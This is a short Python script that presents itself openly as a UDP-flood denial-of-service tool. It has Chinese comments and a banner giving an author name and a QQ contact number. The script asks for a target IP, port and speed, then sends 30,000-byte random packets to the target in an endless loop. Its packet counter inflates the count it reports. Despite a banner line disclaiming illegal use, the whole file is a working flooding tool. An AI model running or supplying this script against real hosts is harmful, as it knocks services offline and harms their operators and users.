# python3

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#攻击字节/带宽修改
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(30000)
#攻击字节/带宽修改

os.system("clear")
os.system("figlet DDos Attack")
print (" ")
print ("/---------------------------------------------------\ ")
print ("|   作者          : xbbddos                       |")
print ("|   作者qq        : 3582126020                       |")
print ("|   版本          : V1.1.1专业魔改版                          |")
print ("\---------------------------------------------------/")
print (" ")
print (" -----------------[请勿用于违法用途]----------------- ")
print (" ")
ip = input("请输入 IP     : ")
port = int(input("攻击端口      : "))
sd = int(input("攻击速度(99999999999999999999999999999999999999) : "))

os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 99999999999999999999999999999999999999
     print ("ddos已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
     time.sleep((99999999999999999999999999999999999999-sd)/99999999999999999999999999999999999999)

